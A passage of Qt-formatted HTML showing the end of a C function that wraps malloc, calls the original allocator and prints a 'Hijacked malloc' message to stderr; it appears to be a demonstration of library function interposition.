<p style=" margin-top:0px; margin-bottom:0px; margin-left:20px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><span style=" font-family:'FreeMono'; color:#6a1009;">    if (orig_malloc != NULL) {</span></p>
<p style=" margin-top:0px; margin-bottom:0px; margin-left:20px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><span style=" font-family:'FreeMono'; color:#6a1009;">      void *ep = orig_malloc(size);</span></p>
<p style=" margin-top:0px; margin-bottom:0px; margin-left:20px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><span style=" font-family:'FreeMono'; color:#6a1009;">      fprintf(stderr, «\nHijacked malloc(%ld)\n\n», size);</span></p>
<p style=" margin-top:0px; margin-bottom:0px; margin-left:20px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><span style=" font-family:'FreeMono'; color:#6a1009;">    }</span></p>
<p style=" margin-top:0px; margin-bottom:0px; margin-left:20px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><span style=" font-family:'FreeMono'; color:#6a1009;">  }</span></p>
<p style="-qt-paragraph-type:empty; margin-top:0px; margin-bottom:0px; margin-left:20px; margin-right:0px; -qt-block-indent:0; text-indent:0px; font-family:'FreeMono'; color:#6a1009;"><br /></p>
<p style=" margin-top:0px; margin-bottom:0px; margin-left:20px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><span style=" font-family:'FreeMono'; color:#6a1009;">  return ep;</span></p>
<p style=" margin-top:0px; margin-bottom:0px; margin-left:20px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><span style=" font-family:'FreeMono'; color:#6a1009;">}</span></p>
<p style="-qt-paragraph-type:empty; margin-top:12px; margin-bottom:12px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px; font-family:'DejaVu LGC Sans'; font-size:12pt;"><br /></p>
<p style="-qt-paragraph-type:empty; margin-top:12px; margin-bottom:12px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><br /></p></body></html>